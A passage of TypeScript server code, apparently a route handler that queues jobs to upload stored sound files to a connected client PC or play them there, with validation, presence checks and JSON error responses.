    const soundId = String(body?.soundId || "").trim();
    if (!soundId) return corsJson({ ok: false, error: "soundId is required" }, 400);

    const entry = await getSound(deps.DATA_DIR, soundId);
    if (!entry) return corsJson({ ok: false, error: "Sound not found" }, 404);
    const filePath = soundFilePath(deps.DATA_DIR, entry);
    const destinationPath = clientDestinationPath(entry);

    const existing = await getClientSoundPresence(deps.DATA_DIR, clientId, entry.id);
    if (presenceMatches(existing, entry.id, entry.sha256, destinationPath)) {
      return corsJson({
        ok: true,
        alreadyUploaded: true,
        soundId: entry.id,
        destinationPath,
        status: "succeeded",
        phase: "succeeded",
        percent: 100,
      });
    }

    const startedAt = now();
    const job: TransferJob = {
      id: uuidv4(),
      kind: "upload",
      clientId,
      soundId: entry.id,
      soundName: entry.name,
      destinationPath,
      clientVersion: target.version,
      requestOrigin: requestOriginFrom(req),
      totalBytes: entry.size,
      bytesTransferred: 0,
      speedBytesPerSecond: 0,
      percent: 0,
      phase: "queued",
      status: "queued",
      startedAt,
      updatedAt: startedAt,
      expiresAt: startedAt + JOB_TTL_MS,
      timeout: null as any,
      clientAcknowledged: false,
    };
    job.timeout = scheduleTransferCleanup(job);
    transferJobs.set(job.id, job);

    void runUploadJob(job, deps, entry, filePath, user, ip);

    return corsJson(serializeJob(job));
  }

  if (playMatch && req.method === "POST") {
    const target = clientManager.getClient(clientId);
    if (!target?.ws) return corsJson({ ok: false, error: "Client is offline" }, 400);

    let body: any = {};
    try {
      body = await req.json();
    } catch {
      body = {};
    }
    const soundId = String(body?.soundId || "").trim();
    if (!soundId) return corsJson({ ok: false, error: "soundId is required" }, 400);

    const entry = await getSound(deps.DATA_DIR, soundId);
    if (!entry) return corsJson({ ok: false, error: "Sound not found" }, 404);
    const destinationPath = clientDestinationPath(entry);

    const presence = await getClientSoundPresence(deps.DATA_DIR, clientId, entry.id);
    if (!presenceMatches(presence, entry.id, entry.sha256, destinationPath)) {
      return corsJson(
        {
          ok: false,
          error: "Sound is not on the client yet. Upload to PC first.",
          code: "not_uploaded",
        },
        409,
      );
    }

    const startedAt = now();
    const job: PlayOnlyJob = {
      id: uuidv4(),
      kind: "play",
      clientId,
      soundId: entry.id,
      soundName: entry.name,
      destinationPath,
      totalBytes: entry.size,
      bytesTransferred: entry.size,
      speedBytesPerSecond: 0,
      percent: 0,
      phase: "queued",
      status: "queued",
      startedAt,
      updatedAt: startedAt,
      expiresAt: startedAt + JOB_TTL_MS,
      timeout: null as any,
      clientAcknowledged: true,
    };
    job.timeout = schedulePlayCleanup(job);
    playJobs.set(job.id, job);

    void runPlayOnlyJob(job, deps, entry, user, ip);

    return corsJson(serializeJob(job));
  }

  return corsJson({ ok: false, error: "Method not allowed" }, 405);
}
